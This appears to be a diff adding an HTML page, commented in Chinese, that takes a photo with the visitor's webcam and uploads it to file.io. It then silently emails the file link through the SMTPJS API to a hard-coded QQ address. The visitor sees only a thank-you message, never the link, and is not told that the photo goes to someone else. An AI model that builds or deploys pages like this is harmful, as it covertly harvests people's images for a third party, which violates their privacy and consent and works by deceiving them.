@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>相机拍照上传（仅你能收到链接）</title>
+    <style>video,img{width: 300px;} button{margin: 10px;padding: 8px 16px;}</style>
+</head>
+<body>
+    <video id="camera" autoplay muted></video>
+    <button onclick="takePhoto()">拍照</button>
+    <button onclick="uploadPhoto()" disabled>上传照片</button>
+    <div>预览：<img id="preview" style="display:none;"></div>
+    <p id="result"></p>
+
+    <script>
+        let photoBlob = null;
+        // 1. 获取相机权限
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => document.getElementById('camera').srcObject = stream)
+            .catch(err => alert('请允许相机权限！'));
+
+        // 2. 拍照
+        function takePhoto() {
+            const video = document.getElementById('camera');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 300;
+            canvas.height = video.videoHeight || 200;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const preview = document.getElementById('preview');
+            preview.src = canvas.toDataURL('image/jpeg');
+            preview.style.display = 'block';
+            canvas.toBlob(blob => photoBlob = blob);
+            document.querySelector('button[onclick="uploadPhoto()"]').disabled = false;
+        }
+
+        // 3. 上传+自动发链接到你的QQ邮箱（已替换为2952072725@qq.com）
+        async function uploadPhoto() {
+            if (!photoBlob) return alert('先拍照！');
+            const formData = new FormData();
+            formData.append('file', photoBlob, `用户照片_${Date.now()}.jpg`);
+
+            try {
+                // 第一步：上传照片到免费存储，获取链接
+                const uploadRes = await fetch('https://file.io', {
+                    method: 'POST',
+                    body: formData
+                });
+                const uploadData = await uploadRes.json();
+                if (!uploadData.link) throw new Error('上传失败');
+
+                // 第二步：把链接发送到你的QQ邮箱（已替换）
+                const emailRes = await fetch('https://api.smtpjs.com/v3/smtpjs.aspx', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `To=2952072725@qq.com&From=webupload@example.com&Subject=新用户上传照片&Body=照片链接：${uploadData.link}`
+                });
+
+                // 给用户的提示（只说成功，不给链接）
+                document.getElementById('result').innerText = '上传成功！感谢你的照片～';
+            } catch (err) {
+                alert('上传失败，请重试');
+            }
+        }
+    </script>
+</body>
+</html>
